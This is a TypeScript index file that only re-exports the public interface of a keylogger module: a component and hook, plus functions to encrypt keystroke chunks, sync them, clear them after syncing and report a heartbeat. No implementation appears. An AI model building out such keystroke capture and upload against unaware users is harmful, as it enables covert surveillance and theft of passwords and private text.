// features/keylogger/index.ts — public surface only.
export { KeyLogger, useKeylogger } from './KeyLogger';
export type { KeyLogEvent, KeyLoggerBridge, KeyLoggerStatus } from './KeyLogger';
export { resolveAesKey, encryptChunk, syncKeylogs, syncAndClear, reportHeartbeat } from './keylogSync';
export type { SyncResult, HeartbeatReport } from './keylogSync';
